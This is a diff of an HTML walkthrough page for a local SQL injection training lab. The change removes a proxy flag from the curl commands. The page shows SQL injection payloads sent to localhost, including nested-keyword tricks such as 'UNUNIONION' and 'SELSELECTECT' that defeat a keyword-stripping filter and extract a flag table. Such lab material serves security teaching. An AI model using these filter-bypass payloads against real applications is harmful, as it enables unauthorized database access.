@@ -12,7 +12,7 @@
         <span class="terminal-title">Step 1. Normal Lookup</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab19" -d "username=admin"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=admin"<br><br>
         <span class="prompt">Input: </span>admin<br><br>
         <span class="prompt">Query: </span>SELECT username, role FROM users WHERE username = 'admin'<br><br>
         <span class="prompt">Result: </span>Username: admin | Role: administrator
@@ -32,7 +32,7 @@
         <span class="terminal-title">Step 2. WAF Blocks Standard Injection</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+UNION+SELECT+1%2C2+FROM+flags+--+-"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+UNION+SELECT+1%2C2+FROM+flags+--+-"<br><br>
         <span class="prompt">Input: </span>' UNION SELECT 1,2 FROM flags -- -<br><br>
         <span class="prompt">WAF Active: </span>Keywords were detected and removed from your input.<br>
         <span class="prompt">Original: </span>' UNION SELECT 1,2 FROM flags -- -<br>
@@ -77,7 +77,7 @@
         <span class="terminal-title">Step 4. Test Nesting</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+OORR+%271%27%3D%271"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+OORR+%271%27%3D%271"<br><br>
         <span class="prompt">Input: </span>' OORR '1'='1<br><br>
         <span class="prompt">WAF filters: </span>"or" removed from "OORR" &rarr; "OR"<br>
         <span class="prompt">After WAF: </span>' OR '1'='1<br><br>
@@ -121,7 +121,7 @@
         <span class="terminal-title">Step 6. Full Bypass Payload</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+UNUNIONION+SELSELECTECT+flag_value%2C+2+FRFROMOM+flags+WHWHEREERE+%271%27%3D%271"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+UNUNIONION+SELSELECTECT+flag_value%2C+2+FRFROMOM+flags+WHWHEREERE+%271%27%3D%271"<br><br>
         <span class="prompt">Input: </span>' UNUNIONION SELSELECTECT flag_value, 2 FRFROMOM flags WHWHEREERE '1'='1<br><br>
         <span class="prompt">WAF filters: </span><br>
         &nbsp;&nbsp;UNUNIONION &rarr; UNION<br>
